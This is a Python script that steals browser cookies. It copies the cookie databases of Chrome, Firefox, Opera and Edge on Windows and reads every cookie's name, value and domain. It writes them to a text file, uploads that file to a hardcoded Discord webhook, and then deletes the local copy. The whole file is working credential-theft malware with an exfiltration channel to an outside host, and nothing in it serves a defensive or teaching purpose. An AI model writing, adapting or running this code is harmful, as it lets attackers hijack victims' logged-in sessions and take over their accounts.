import sqlite3
import os
import shutil
import json
import requests

webhook_url = "https://discord.com/api/webhooks/1291410949953294356/Rg25QYZ7sZNo1JmUXd_hkq-yLe4oCAOgCqMcRKuLRnZpmeEELo1bfAFXqElbdpYvUdfx"  # Replace with your Discord webhook URL

def copy_db(source_path, dest_path):
    """Copy the SQLite database to avoid locking issues."""
    try:
        shutil.copyfile(source_path, dest_path)
    except Exception as e:
        print(f"Error copying database: {e}")

def get_chrome_cookies():
    """Extract cookies from Google Chrome."""
    chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default\Cookies')
    temp_db = "chrome_cookies_temp.db"
    copy_db(chrome_path, temp_db)

    cookies = {}
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT name, value, host_key FROM cookies')
        cookies = {name: {'value': value, 'domain': host_key} for name, value, host_key in cursor.fetchall()}
    except Exception as e:
        print(f"Error fetching Chrome cookies: {e}")
    finally:
        conn.close()  # Ensure the connection is closed
        if os.path.exists(temp_db):
            os.remove(temp_db)  # Remove the temp db only after closing the connection

    return cookies

def get_firefox_cookies():
    """Extract cookies from Mozilla Firefox."""
    firefox_path = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox\Profiles')
    cookies = {}
    try:
        for profile in os.listdir(firefox_path):
            profile_path = os.path.join(firefox_path, profile)
            if os.path.isdir(profile_path):
                cookies_path = os.path.join(profile_path, 'cookies.sqlite')
                if os.path.exists(cookies_path):
                    temp_db = "firefox_cookies_temp.db"
                    copy_db(cookies_path, temp_db)

                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT name, value, host FROM moz_cookies')
                    cookies.update({name: {'value': value, 'domain': host} for name, value, host in cursor.fetchall()})
                    conn.close()  # Ensure the connection is closed
                    os.remove(temp_db)  # Remove the temp db only after closing the connection
    except Exception as e:
        print(f"Error fetching Firefox cookies: {e}")
    return cookies

def get_opera_cookies():
    """Extract cookies from Opera."""
    opera_path = os.path.join(os.getenv('APPDATA'), r'Opera Software\Opera Stable\Cookies')
    temp_db = "opera_cookies_temp.db"
    copy_db(opera_path, temp_db)

    cookies = {}
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT name, value, host_key FROM cookies')
        cookies = {name: {'value': value, 'domain': host_key} for name, value, host_key in cursor.fetchall()}
    except Exception as e:
        print(f"Error fetching Opera cookies: {e}")
    finally:
        conn.close()  # Ensure the connection is closed
        if os.path.exists(temp_db):
            os.remove(temp_db)  # Remove the temp db only after closing the connection

    return cookies

def get_edge_cookies():
    """Extract cookies from Microsoft Edge."""
    edge_path = os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data\Default\Cookies')
    temp_db = "edge_cookies_temp.db"
    copy_db(edge_path, temp_db)

    cookies = {}
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT name, value, host_key FROM cookies')
        cookies = {name: {'value': value, 'domain': host_key} for name, value, host_key in cursor.fetchall()}
    except Exception as e:
        print(f"Error fetching Edge cookies: {e}")
    finally:
        conn.close()  # Ensure the connection is closed
        if os.path.exists(temp_db):
            os.remove(temp_db)  # Remove the temp db only after closing the connection

    return cookies

def save_cookies_to_file(cookies, filename="cookies.txt"):
    """Save cookies to a text file."""
    with open(filename, "w") as f:
        for name, data in cookies.items():
            f.write(f"Name: {name}, Value: {data['value']}, Domain: {data['domain']}\n")
    return os.path.abspath(filename)  # Return the absolute path of the file

def send_file_via_webhook(file_path, webhook_url):
    """Send the specified file via a Discord webhook."""
    with open(file_path, 'rb') as file:
        response = requests.post(
            webhook_url,
            files={'file': file},
            data={'content': 'Here are the cookies:'}
        )

    if response.status_code == 200:
        print(f"File sent successfully! Response: {response.json()}")
    else:
        print(f"Failed to send file. Status code: {response.status_code}, Response: {response.text}")

def delete_cookies_file(filename="cookies.txt"):
    """Delete the specified cookies file."""
    if os.path.exists(filename):
        os.remove(filename)
        print(f"Deleted cookies file: {filename}")
    else:
        print(f"Cookies file not found: {filename}")

def main():
    all_cookies = {}
    all_cookies.update(get_chrome_cookies())
    all_cookies.update(get_firefox_cookies())
    all_cookies.update(get_opera_cookies())
    all_cookies.update(get_edge_cookies())

    # Save cookies to a file and get the file path
    file_path = save_cookies_to_file(all_cookies)

    # Print the file path of the saved cookies
    print(f"Cookies saved to: {file_path}")

    # Send the cookies file via webhook
    send_file_via_webhook(file_path, webhook_url)

    # Delete the cookies file after sending
    delete_cookies_file(file_path)

if __name__ == "__main__":
    main()
